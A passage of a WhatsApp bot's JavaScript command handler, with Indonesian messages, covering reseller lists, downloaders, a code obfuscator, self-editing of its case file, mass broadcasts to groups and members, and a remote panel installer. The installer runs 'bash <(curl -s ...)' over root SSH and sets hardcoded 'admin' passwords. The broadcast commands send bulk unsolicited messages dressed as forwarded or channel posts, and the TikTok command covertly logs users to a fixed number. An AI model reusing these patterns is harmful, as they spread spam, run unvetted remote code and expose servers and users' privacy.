const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi reseller!`)
premium.push(input)
await fs.writeFileSync("./Data/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menambah reseller ✅`)
}
break

//=============================================//

case "listseller": {
if (premium.length < 1) return m.reply("Tidak ada user reseller")
let teks = `\n *乂 List all reseller panel*\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
mix.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break

//=============================================//

case "delseller": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner!`)
if (!premium.includes(input)) return m.reply(`Nomor ${input2} bukan reseller!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./Data/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menghapus reseller ✅`)
}
break

//=============================================//

case "reqfitur": {
 if (!text) return m.reply(example("teksnya"))

 const d = new Date();
 const options = {
   timeZone: 'Asia/Jakarta',
   hour: '2-digit',
   minute: '2-digit',
   weekday: 'long',
   day: 'numeric',
   month: 'long',
   year: 'numeric'
 };

 const formatter = new Intl.DateTimeFormat('id-ID', options);
 const parts = formatter.formatToParts(d);

 const jam = parts.find(p => p.type === 'hour').value;
 const menit = parts.find(p => p.type === 'minute').value;
 const hari = parts.find(p => p.type === 'weekday').value;
 const tanggal = parts.find(p => p.type === 'day').value;
 const bulan = parts.find(p => p.type === 'month').value;
 const tahun = parts.find(p => p.type === 'year').value;

 const waktuLengkap = `${jam}:${menit} WIB, ${hari}, ${tanggal} ${bulan} ${tahun}`;

 // Ganti dari const idChannels menjadi global.idChannel2
 const idChannels = global.idChannel2;

 let namaPengirim = "Tidak Terbaca";
 try {
   namaPengirim = await mix.getName(m.sender);
 } catch {
   namaPengirim = m.pushName || "Tidak Terbaca";
 }

 const teks = `📮 *Permintaan Fitur Baru dari Pengguna*

📝 *Isi Permintaan Fitur:* ${text}
*🧑 Pengirim:* @${m.sender.split("@")[0]}
*🆔 Nomor:* wa.me/${m.sender.split("@")[0]}
*👤 Nama WA:* ${namaPengirim}
*🕒 Waktu:* ${waktuLengkap}

*📢 Catatan:*
* Permintaan ini dikirim secara otomatis oleh sistem bot melalui perintah */reqfitur*.
* Permintaan akan di terima sesuai kemampuan kami.`;

 const nglUrl = `https://flowfalcon.dpdns.org/imagecreator/ngl?title=Request+Feature&text=${text}`;

 for (let id of idChannels) {
   try {
     await mix.sendMessage(id, {
       image: { url: nglUrl },
       caption: teks,
       mentions: [m.sender]
     }, { quoted: m });
     await sleep(1000);
   } catch (e) {
     console.log(`Gagal kirim ke ${id}:`, e.message);
   }
 }

 m.reply("✅ Permintaan fitur berhasil dikirim ke channel!");
}
break

//=============================================//

case "totalcase": {
 if (!isCreator) return Reply(mess.owner);
 const fs = require('fs');
 const namaFile = 'Commands/case.js';

 fs.readFile(namaFile, 'utf8', (err, data) => {
 if (err) {
 console.error('Terjadi kesalahan saat membaca file:', err);
 return Reply('Gagal membaca file');
 }

 // Gunakan regex untuk menghitung jumlah case
 const regex = /case\s+["'`](.+?)["'`]:/g;
 const matches = [...data.matchAll(regex)];

 const total = matches.length;
 return Reply(`Total case yang ditemukan: ${total}`);
 });
}
break

//=============================================//

case "pin": case "pinterest": {
if (!text) return m.reply('Masukkan keyword\nContoh: .pin kucing')

let res = await fetch(`https://berak.vercel.app/search/pin?q=${encodeURIComponent(text)}`)
let json = await res.json()

if (!json.status || !json.result.length) return m.reply('Tidak ditemukan hasil.')

const hasil = json.result.slice(0, 5) // ambil 10 data
const cards = []
async function image(url) {
const {
imageMessage
} = await generateWAMessageContent({
image: {
url
}
}, {
upload: mix.waUploadToServer
})
return imageMessage
}
for (let item of hasil) {
cards.push({
header: {
imageMessage: await image(item.image), // fungsi image() harus tersedia
hasMediaAttachment: true,
},
body: {
text: `## *${item.fullname || 'Tidak diketahui'}*\n` +
`> 👤 Upload by: ${item.upload_by}\n` +
`> 👥 Followers: ${item.followers}\n\n` +
`${item.caption || '_Tidak ada caption_'}`,
},
nativeFlowMessage: {
buttons: [{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "🌐 Sumber Pinterest",
url: item.source,
webview_presentation: null
}),
}],
},
})
}

const msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
interactiveMessage: {
body: {
text: `🔎 Hasil Pencarian: *${text}*`,
},
carouselMessage: {
cards,
messageVersion: 1
}
}
}
}
}, {})

await mix.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id,
})
}
break

//=============================================//

case "cekcase": {
 if (!isCreator) return Reply(mess.owner);
 if (!q) return Reply('Masukkan nama case yang ingin dicek.\nContoh: cekcase delcase');

 const fs = require('fs');
 const namaFile = 'Commands/case.js';
 const namaCase = q.trim();

 fs.readFile(namaFile, 'utf8', (err, data) => {
 if (err) {
 console.error('Terjadi kesalahan saat membaca file:', err);
 return Reply('Gagal membaca file case.js');
 }

 const lines = data.split('\n');
 let foundLine = -1;

 for (let i = 0; i < lines.length; i++) {
 if (lines[i].includes(`case "${namaCase}"`) || lines[i].includes(`case '${namaCase}'`)) {
 foundLine = i;
 break;
 }
 }

 if (foundLine === -1) {
 return Reply(`❌ Case *"${namaCase}"* tidak ditemukan dalam file.`);
 }

 return Reply(
 `✅ *Case ditemukan!*\n\n` +
 `• *Nama Case:* ${namaCase}\n` +
 `• *Berada di Baris:* ${foundLine + 1}`
 );
 });
}
break

//=============================================//

case "getcase": {
if (!isCreator) return Reply(mess.owner);
if (!text) return Reply(example("menu"));
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./Commands/case.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
m.reply(`${getcase(q)}`)
} catch (e) {
return Reply(`Case *${text}* tidak ditemukan`)
}
}
break

//=============================================//

case "listcase": {
if (!isCreator) return Reply(mess.owner);
 const fs = require('fs');
 const namaFile = 'Commands/case.js';

 fs.readFile(namaFile, 'utf8', (err, data) => {
 if (err) {
 console.error('Terjadi kesalahan saat membaca file:', err);
 return Reply('Gagal membaca file');
 }

 const regex = /case\s+["'](.+?)["']:/g;
 let match;
 let hasil = [];

 while ((match = regex.exec(data)) !== null) {
 hasil.push(match[1]);
 }

 if (hasil.length === 0) {
 return Reply('Tidak ada case yang ditemukan dalam file.');
 }

 const totalCase = hasil.length;

 const rows = hasil.map(v => ({
 title: `📁 ${v}`,
 description: `Klik untuk ambil isi case "${v}"`,
 id: `.getcase ${v}`
 }));

 const sections = [
 {
 title: `📦 Total Case: ${totalCase}`,
 rows: rows
 }
 ];

 return mix.sendMessage(m.chat, {
 buttons: [
 {
 buttonId: 'listcase_list',
 buttonText: { displayText: 'Lihat Daftar Case' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: 'Lihat Daftar Case',
 sections: sections
 })
 }
 }
 ],
 footer: '© WhatsApp Bots - 2025',
 headerType: 1,
 text: 'Ketuk tombol di bawah untuk melihat semua case.',
 viewOnce: true,
 contextInfo: {
 isForwarded: true,
 mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
 }
 }, { quoted: m });
 });
}
break

//=============================================//

case "delcase": {
    if (!isCreator) return Reply(mess.owner);
    if (!text) return Reply(example("menu"));

    const getcase = async (cases) => {
        try {
            const script = await fs.readFileSync('./Commands/case.js', 'utf8');
            const match = script.match(new RegExp(`case "${cases}".*?break`, "s"));
            return match ? match[0] : null;
        } catch (err) {
            return null;
        }
    };

    try {
        let dell = await getcase(text);
        if (!dell) return Reply(`Case *${text}* tidak ditemukan`);

        const konn = await fs.readFileSync("./Commands/case.js", "utf8");
        const databaru = konn.replace(dell, '').trim();

        await fs.writeFileSync("./Commands/case.js", databaru, "utf8");
        return Reply(`Berhasil menghapus case *${text}*`);
    } catch (e) {
        return Reply(`Terjadi kesalahan: ${e.message}`);
    }
}
break

//=============================================//
        
case "addcase": {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("case nya"));
const fs = require('fs');
const namaFile = 'Commands/case.js';
const caseBaru = `${text}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
if (err) {
console.error('Terjadi kesalahan saat membaca file:', err);
return Reply('Gagal membaca file');
}
const posisiAwal = data.indexOf("switch (command) {");
if (posisiAwal !== -1) {
const posisiInsert = posisiAwal + "switch (command) {".length;
const kodeBaruLengkap = data.slice(0, posisiInsert) + '\n\n' + caseBaru + '\n' + data.slice(posisiInsert);
fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
if (err) {
m.reply('Terjadi kesalahan saat menulis file: ' + err);
} else {
m.reply('Case baru berhasil ditambahkan.');
}
});
} else {
m.reply('Tidak dapat menemukan switch statement dalam file.');
}
});
}
break
        
//=============================================//

case "mediafire":
 if (!text) return m.reply("Masukkan link MediaFire yang ingin diunduh!");
 try {
 const response = await fetch('https://r.jina.ai/' + text, { 
 headers: { 'x-return-format': 'html' } 
 });
 if (!response.ok) throw new Error("Gagal mengambil data dari MediaFire!");
 const cheerio = require('cheerio');
 const textHtml = await response.text();
 const $ = cheerio.load(textHtml);
 const TimeMatch = $('div.DLExtraInfo-uploadLocation div.DLExtraInfo-sectionDetails')
 .text()
 .match(/This file was uploaded from (.*?) on (.*?) at (.*?)\n/);
 const fileSize = $('a#downloadButton').text().trim().split('\n')[0].trim();
 const result = {
 title: $('div.dl-btn-label').text().trim() || "Tidak diketahui",
 filename: $('div.dl-btn-label').attr('title') || "file",
 url: $('a#downloadButton').attr('href'),
 size: fileSize || "Tidak diketahui",
 from: TimeMatch?.[1] || "Tidak diketahui",
 date: TimeMatch?.[2] || "Tidak diketahui",
 time: TimeMatch?.[3] || "Tidak diketahui"
 };
 if (!result.url) throw new Error("Gagal mendapatkan link unduhan!");
 const caption = `✅ *Berhasil mengunduh file dari MediaFire!*\n\n`
 + `📂 *Nama File:* ${result.filename}\n`
 + `📦 *Ukuran:* ${result.size}\n`
 + `📅 *Tanggal Unggah:* ${result.date}\n`
 + `⏰ *Waktu Unggah:* ${result.time}\n`
 + `🌍 *Diupload dari:* ${result.from}\n\n`
 + `?? *Link:* ${result.url}`;
 await mix.sendMessage(m.chat, { 
 document: { url: result.url },
 mimetype: 'application/octet-stream',
 fileName: result.filename,
 caption: caption
 }, { quoted: m });
 } catch (error) {
 m.reply(`❌ *Gagal mengunduh file:* ${error.message}`);
 }
 break

//=============================================//
        
case "tt":
case "tiktok": {
 if (!text) return Reply(example("url"));
 if (!text.startsWith("https://")) return Reply(example("url"));

 let userJid = m.sender;
 let isGroup = m.isGroup;
 let userName = mix.getName ? await mix.getName(userJid) : userJid;

 await tiktokDl(text).then(async (result) => {
 if (!result.status) {
 return mix.sendMessage(userJid, { text: "Gagal ambil data TikTok." }, { quoted: m });
 }

 // SLIDE (image)
 if (result.durations == 0 && result.duration == "0 Seconds") {
 let araara = [];
 let urutan = 0;

 for (let a of result.data) {
 let imgsc = await prepareWAMessageMedia({ image: { url: `${a.url}` } }, { upload: mix.waUploadToServer });
 araara.push({
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `Foto Slide Ke *${++urutan}*`,
 hasMediaAttachment: true,
 ...imgsc
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [{
 "name": "cta_url",
 "buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
 }]
 })
 });
 }

 const msgii = await generateWAMessageFromContent(userJid, {
 viewOnceMessageV2Extension: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: "*Tiktok Downloader ✅*"
 }),
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
 cards: araara
 })
 })
 }
 }
 }, { userJid });

 await mix.relayMessage(userJid, msgii.message, { messageId: msgii.key.id });

 } else {
 // VIDEO
 let urlVid = result.data.find(e => e.type === "nowatermark_hd" || e.type === "nowatermark");
 await mix.sendMessage(userJid, {
 video: { url: urlVid.url },
 mimetype: 'video/mp4',
 caption: `*Tiktok Downloader ✅*`
 });
 }

 // Kirim notifikasi ke grup kalo perintahnya dari grup
 if (isGroup) {
 await mix.sendMessage(m.chat, {
 text: `*${userName}*, hasil download kamu udah dikirim ke private chat ya!`
 }, { quoted: m });
 }

 // OPTIONAL: kirim log ke owner atau admin
 let logJid = "6288226579576@s.whatsapp.net"; // ganti ke nomor admin
 await mix.sendMessage(logJid, {
 text: `Hai Ada Yang Pake TikTok Download oleh: ${userName}\nGroup: ${isGroup ? m.chat : "Private"}\nURL: ${text}`
 });

 }).catch(e => {
 console.error("Tiktok Error:", e);
 mix.sendMessage(userJid, { text: "Terjadi error saat proses TikTok." }, { quoted: m });
 if (isGroup) m.reply("Gagal download. Cek PM buat detail error.");
 });
}
break
        
//=============================================//

case "hd": case "remini": {
if (!/image/.test(mime)) return Reply(example("dengan kirim/reply foto"))
let foto = await mix.downloadAndSaveMediaMessage(qmsg)
let result = await remini(await fs.readFileSync(foto), "enhance")
await mix.sendMessage(m.chat, {image: result}, {quoted: m})
await fs.unlinkSync(foto)
}
break

//=============================================//
        
case "developerbot": case "owner": {
await mix.sendContact(m.chat, [global.owner], m)
}
break

//=============================================//

case "save": case "sv": {
if (!isCreator) return
await mix.sendContact(m.chat, [m.chat.split("@")[0]], m)
}
break

//=============================================//

case "enchard": case "encrypthard": {
if (!/javascript/g.test(mime)) return Reply("dengan kirim file .js")
const strings = text ? text : "Skyzopedia"
let media = m.quoted ? await m.quoted.download() : await m.download()
let filename = m.quoted ? m.quoted.fakeObj.message.documentMessage.fileName : m.fakeObj.message.documentMessage.fileName
await m.reply("Proses Encrypt . . .")
await Obfus.obfuscate(media.toString(), {
  target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,

    identifierGenerator: function() {
        const originalString = `素晴座素晴${strings}`

        function hapusKarakterTidakDiinginkan(input) {
            return input.replace(
                /[^a-zA-Z/*ᨒZenn/*^/*($break)*/]/g, ''
            );
        }

        function stringAcak(panjang) {
            let hasil = '';
            const karakter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
            const panjangKarakter = karakter.length;

            for (let i = 0; i < panjang; i++) {
                hasil += karakter.charAt(
                    Math.floor(Math.random() * panjangKarakter)
                );
            }
            return hasil;
        }

        return hapusKarakterTidakDiinginkan(originalString) + stringAcak(2);
    },

    renameVariables: true,
    renameGlobals: true,

    // Kurangi encoding dan pemisahan string untuk mengoptimalkan ukuran
    stringEncoding: 0.01, 
    stringSplitting: 0.1, 
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: true,

    shuffle: {
        hash: false,
        true: false
    },
    controlFlowFlattening: false, 
    opaquePredicates: false, 
    deadCode: false, 
    dispatcher: false,
    rgf: false,
    calculator: false,
    hexadecimalNumbers: false,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./enchard-${filename}`, obfuscated.code)
  await mix.sendMessage(m.chat, {document: await fs.readFileSync(`./enchard-${filename}`), mimetype: "application/javascript", fileName: filename, caption: `Sukses encrypt ${filename} ✅`}, {quoted: m})
}).catch(e => m.reply("Error :" + e))
await fs.unlinkSync(`./enchard-${filename}`)
}
break
    
//=============================================//

case "idch":
case "cekidch": {
  if (!text) {
    return await mix.sendMessage(m.chat, { text: "Link channelnya mana?" });
  }

  if (!text.includes("https://whatsapp.com/channel/")) {
    return await mix.sendMessage(m.chat, { text: "Link tautan tidak valid" });
  }

  let result = text.split('https://whatsapp.com/channel/')[1];
  let res = await mix.newsletterMetadata("invite", result);

  let teks = `*ID:* ${res.id}
*Nama:* ${res.name}
*Total Pengikut:* ${res.subscribers}
*Status:* ${res.state}
*Verified:* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`;

  let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: {
            text: teks
          },
          footer: {
            text: "© WhatsApp Bots - 2025"
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "cta_copy",
                buttonParamsJson: `{
                  "display_text": "📋 Copy ID Channel",
                  "copy_code": "${res.id}"
                }`
              },
              {
                name: "single_select",
                buttonParamsJson: `{
                  "title": "📌 Menu Terkait",
                  "sections": [
                    {
                      "title": "🔖 Main Features",
                      "rows": [
                        { "title": "📚 All Menu", "id": ".menu" }
                      ]
                    },
                    {
                      "title": "👤 Owner & Info",
                      "rows": [
                        { "title": "👑 Contact Owner", "id": ".owner" }
                      ]
                    }
                  ]
                }`
              }
            ]
          }
        }
      }
    }
  }, { quoted: m });

  await mix.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
}
break;

//=============================================//

case "pushkontak2": {
 if (!isCreator) return Reply(mess.owner)
 if (!text) return m.reply("Formatnya salah!\nContoh:\npushkontak2 idgc|jeda(ms)|teksnya")

 let [idgc, jeda, ...pesanArray] = text.split("|")
 if (!idgc || !jeda || !pesanArray.length) return m.reply("❌ Format salah. Gunakan: idgc|jeda(ms)|pesan")

 const teks = pesanArray.join("|").trim()
 const delay = parseInt(jeda)

 const data = await mix.groupMetadata(idgc)
 const halls = data.participants
 .map(v => v.id)
 .filter(id => id !== botNumber && id !== `${global.owner}@s.whatsapp.net`)

 if (!halls.length) return m.reply("❌ Tidak ada member valid di grup ini")

 await m.reply(`📨 Mengirim pesan ke *${halls.length}* member dengan jeda ${delay}ms`)

 for (let mem of halls) {
 await mix.sendMessage(mem, {
 text: `${teks}\n\nKlik tombol di bawah jika sudah save:`,
 footer: "Powered by " + botname2,
 buttons: [
 { buttonId: `.donesave`, buttonText: { displayText: '❤️ Done Save' }, type: 1 }
 ],
 headerType: 1
 })
 await sleep(delay)
 }

 await mix.sendMessage(m.chat, {
 text: `✅ *Pushkontak selesai!*\nTerkirim ke ${halls.length} member.`,
 }, { quoted: m })
}
break

//=============================================//

case "donesave": {
 const nomor = m.sender.split("@")[0]
 const nama = m.pushName || nomor

 const vcard = `BEGIN:VCARD
VERSION:3.0
FN:${nama}
TEL;type=CELL;type=VOICE;waid=${nomor}:${nomor}
END:VCARD`

 const bufferVcf = Buffer.from(vcard, "utf-8")

 // Kirim VCF ke PM bot (self chat)
 await mix.sendMessage(mix.user.id, {
 document: bufferVcf,
 fileName: `${nama}.vcf`,
 mimetype: 'text/vcard',
 caption: `📥 Kontak dari @${nomor} ${nama}\n\n✅ Sudah save bot!`,
 mentions: [m.sender]
 })

 // Kasih respon ke user (bisa di grup/chat asal)
 await m.reply('📮 Makasih udah save! jangan lupa save back Mamix ✅')
}
break

//=============================================//

case "pushkontak": {
  if (!isCreator) return Reply(mess.owner)
  if (!text) return Reply(example("pesannya"))

  const meta = await mix.groupFetchAllParticipating()
  const dom = Object.keys(meta)
  global.textpushkontak = text

  let list = dom.map(id => ({
    title: meta[id].subject,
    id: `.respushkontak ${id}`,
    description: `${meta[id].participants.length} Member`
  }))

  return mix.sendMessage(m.chat, {
    buttons: [
      {
        buttonId: 'action',
        buttonText: { displayText: 'ini pesan interactiveMeta' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: 'Pilih Grup',
            sections: [{ title: 'List Grup Chat', rows: list }]
          })
        }
      }
    ],
    footer: `© WhatsApp Bots - 2025`,
    headerType: 1,
    viewOnce: true,
    text: "Pilih Target Grup Pushkontak\n",
    contextInfo: {
      isForwarded: true,
      mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
    },
  }, { quoted: m })
}
break

//=============================================//

case "respushkontak": {
  if (!isCreator) return
  if (!text || !global.textpushkontak) return

  const idgc = text
  const teks = global.textpushkontak
  const jidawal = m.chat

  const data = await mix.groupMetadata(idgc)
  const halls = data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)

  await m.reply(`Memproses *pushkontak* ke grup *${data.subject}*...`)

  for (let mem of halls) {
    if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
      await mix.sendMessage(mem, { text: teks }, { quoted: qlocPush })
      await sleep(global.delayPushkontak)
    }
  }

  delete global.textpushkontak
  await mix.sendMessage(jidawal, {
    text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`
  }, { quoted: m })
}
break

//=============================================//

case "jpmht": {
if (!isCreator) return Reply(mess.owner);
if (!text) return Reply(`Format salah!\n\nContoh penggunaan :\n.jpm teks & foto (opsional)`)
    let mediaPath
    const mimeType = mime
    if (/image/.test(mimeType)) {
        mediaPath = await mix.downloadAndSaveMediaMessage(qmsg)
    }
    const allGroups = await mix.groupFetchAllParticipating()
    const groupIds = Object.keys(allGroups)
    let successCount = 0
    const messageContent = mediaPath
        ? { image: await fs.readFileSync(mediaPath), caption: text, mentions: [] }
        : { text: text, mentions: [] }
    const senderChat = m.chat
    await m.reply(`Memproses ${mediaPath ? "JPM teks & foto" : "JPM teks"} hidetag ke ${groupIds.length} grup chat`)
    
    for (const groupId of groupIds) {
        try {
            messageContent.mentions = allGroups[groupId].participants.map(e => e.id)
            await mix.sendMessage(groupId, messageContent, { quoted: FakeChannel })
            successCount++
        } catch (err) {
            console.error(`Gagal kirim ke grup ${groupId}:`, err)
        }
        await sleep(5000)
    }

    if (mediaPath) await fs.unlinkSync(mediaPath)
    await mix.sendMessage(senderChat, {
        text: `JPM ${mediaPath ? "teks & foto" : "teks"} hidetag berhasil dikirim ke ${successCount} grup.`,
    }, { quoted: m })
}
break

//=============================================//

case "jpm": {
if (!isCreator) return Reply(mess.owner);
if (!text) return Reply(`Format salah!\n\nContoh penggunaan :\n.jpm teks & foto (opsional)`)
    let mediaPath
    const mimeType = mime
    if (/image/.test(mimeType)) {
        mediaPath = await mix.downloadAndSaveMediaMessage(qmsg)
    }
    const allGroups = await mix.groupFetchAllParticipating()
    const groupIds = Object.keys(allGroups)
    let successCount = 0
    const messageContent = mediaPath
        ? { image: await fs.readFileSync(mediaPath), caption: text }
        : { text }
    const senderChat = m.chat
    await m.reply(`Memproses ${mediaPath ? "JPM teks & foto" : "JPM teks"} ke ${groupIds.length} grup chat`)
    
    for (const groupId of groupIds) {
        try {
            await mix.sendMessage(groupId, messageContent, { quoted: FakeChannel })
            successCount++
        } catch (err) {
            console.error(`Gagal kirim ke grup ${groupId}:`, err)
        }
        await sleep(5000)
    }

    if (mediaPath) await fs.unlinkSync(mediaPath)
    await mix.sendMessage(senderChat, {
        text: `JPM ${mediaPath ? "teks & foto" : "teks"} berhasil dikirim ke ${successCount} grup.`,
    }, { quoted: m })
}
break

//=============================================//

case "sendtesti":
case "testi":
case "uptesti": {
    if (!isCreator) return Reply(mess.owner)
    if (!text) return Reply(`Format salah!\n\nContoh penggunaan :\n.${command} teks & foto (opsional)`)
    let mediaPath
    const mimeType = mime
    if (/image/.test(mimeType)) {
        mediaPath = await mix.downloadAndSaveMediaMessage(qmsg)
    }
    const allGroups = await mix.groupFetchAllParticipating()
    const groupIds = Object.keys(allGroups)
    let successCount = 0
    const messageText = text
    const senderChat = m.chat
    await m.reply(`Memproses jpm testimoni ke saluran & ${groupIds.length} grup...`)
    try {
        const messageContent = mediaPath
            ? { image: await fs.readFileSync(mediaPath), caption: messageText }
            : { text: messageText }

        await mix.sendMessage(global.idChannel, messageContent)
    } catch (err) {
        console.error("Gagal mengirim ke saluran:", err)
    }
    const groupMessage = mediaPath
        ? { image: await fs.readFileSync(mediaPath), caption: messageText }
        : { text: messageText }
    for (const groupId of groupIds) {
        try {
            await mix.sendMessage(groupId, {
                ...groupMessage,
                contextInfo: {
                    isForwarded: true,
                    mentionedJid: [m.sender],
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: global.idChannel,
                        newsletterName: global.namaChannel
                    }
                }
            }, { quoted: FakeLocation })

            successCount++
        } catch (err) {
            console.error(`Gagal mengirim ke grup ${groupId}:`, err)
        }
        await sleep(5000)
    }
    if (mediaPath) {
        await fs.unlinkSync(mediaPath)
    }
    await mix.sendMessage(senderChat, {
        text: `Testimoni berhasil dikirim ke saluran & ${successCount} grup.`,
    }, { quoted: m })

}
break

//=============================================//

case "done":
case "don":
case "proses":
case "ps": {
    if (!isCreator) return Reply("Fitur ini untuk owner bot!")
    if (!text) return Reply(`*Contoh penggunaan:*\n.${command} <teks transaksi>`);
    const status = /done|don/.test(command) ? "Transaksi Done ✅" : "Dana Masuk ✅";
    const teks = `
*${status}*

📦 \`${text}\`
🗓️ ${global.tanggal(Date.now())}

* *Testimoni*
whatsapp.com/channel/0029Vb8cgMEH5JLqiOEdbH1t
* *Marketplace*
chat.whatsapp.com/LEgsVRF1OOLJaS3ESkuX0l
`;
    await mix.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            isForwarded: true,
            forwardingScore: 9999
        }
    }, { quoted: FakeLocation });
}
break;

//=============================================//

case "installpanel": {
    if (!isCreator) return Reply(mess.owner);
    if (!text) return Reply("Contoh: *.instalpanel* ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*");
    
    let vii = text.split("|");
    if (vii.length < 5) return Reply("Contoh: *.instalpanel* ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*");
    
    const ress = new ssh2.Client();
    const connSettings = {
        host: vii[0],
        port: '22',
        username: 'root',
        password: vii[1]
    };
    
    const jids = m.chat
    const pass = "admin001";
    let passwordPanel = pass;
    const domainpanel = vii[2];
    const domainnode = vii[3];
    const ramserver = vii[4];
    const deletemysql = `\n`;
    const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`;
    
    async function instalWings() {
    ress.exec(commandPanel, async (err, stream) => {
        if (err) {
            console.error('Wings installation error:', err);
            m.reply(`Gagal memulai instalasi Wings: ${err.message}`);
            return ress.end();
        }
        
        stream.on('close', async (code, signal) => {
            await InstallNodes()            
        }).on('data', async (data) => {
            const dataStr = data.toString();
            console.log('Wings Install: ' + dataStr);
            
            if (dataStr.includes('Input 0-6')) {
                stream.write('1\n');
            }
            else if (dataStr.includes('(y/N)')) {
                stream.write('y\n');
            }
            else if (dataStr.includes('Enter the panel address (blank for any address)')) {
                stream.write(`${domainpanel}\n`);
            }
            else if (dataStr.includes('Database host username (pterodactyluser)')) {
                stream.write('admin\n');
            }
            else if (dataStr.includes('Database host password')) {
                stream.write('admin\n');
            }
            else if (dataStr.includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
                stream.write(`${domainnode}\n`);
            }
            else if (dataStr.includes('Enter email address for Let\'s Encrypt')) {
                stream.write('admin@gmail.com\n');
            }
        }).stderr.on('data', async (data) => {
            console.error('Wings Install Error: ' + data);
            m.reply(`Error pada instalasi Wings:\n${data}`);
        });
    });
}

    async function InstallNodes() {
        ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
            if (err) throw err;
            
            stream.on('close', async (code, signal) => {
                let teks = `
*Install Panel Telah Berhasil ✅*

*Berikut Detail Akun Panel Kamu 📦*

*👤 Username :* admin
*🔐 Password :* ${passwordPanel}
*🌐 ${domainpanel}*

Silahkan setting alocation & ambil token node di node yang sudah di buat oleh bot

*Cara menjalankan wings :*
*.startwings* ipvps|pwvps|tokennode
`;
                await mix.sendMessage(jids, {text: teks}, {quoted: m})
                ress.end();
            }).on('data', async (data) => {
                await console.log(data.toString());
                if (data.toString().includes("Masukkan nama lokasi: ")) {
                    stream.write('Singapore\n');
                }
                if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
                    stream.write('Node By Skyzo\n');
                }
                if (data.toString().includes("Masukkan domain: ")) {
                    stream.write(`${domainnode}\n`);
                }
                if (data.toString().includes("Masukkan nama node: ")) {
                    stream.write('Skyzopedia\n');
                }
                if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
                    stream.write(`${ramserver}\n`);
                }
                if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
                    stream.write(`${ramserver}\n`);
                }
                if (data.toString().includes("Masukkan Locid: ")) {
                    stream.write('1\n');
                }
            }).stderr.on('data', async (data) => {
                console.log('Stderr : ' + data);
                m.reply(`Error pada instalasi Wings: ${data}`);
            });
        });
    }

    async function instalPanel() {
        ress.exec(commandPanel, (err, stream) => {
            if (err) throw err;
            
            stream.on('close', async (code, signal) => {
                await instalWings();
            }).on('data', async (data) => {
                if (data.toString().includes('Input 0-6')) {
                    stream.write('0\n');
                } 
                if (data.toString().includes('(y/N)')) {
                    stream.write('y\n');
                } 
                if (data.toString().includes('Database name (panel)')) {
                    stream.write('\n');
                }
                if (data.toString().includes('Database username (pterodactyl)')) {
                    stream.write('admin\n');
                }
                if (data.toString().includes('Password (press enter to use randomly generated password)')) {
                    stream.write('admin\n');
                } 
                if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
                    stream.write('Asia/Jakarta\n');
                } 
                if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
                    stream.write('admin@gmail.com\n');
                } 
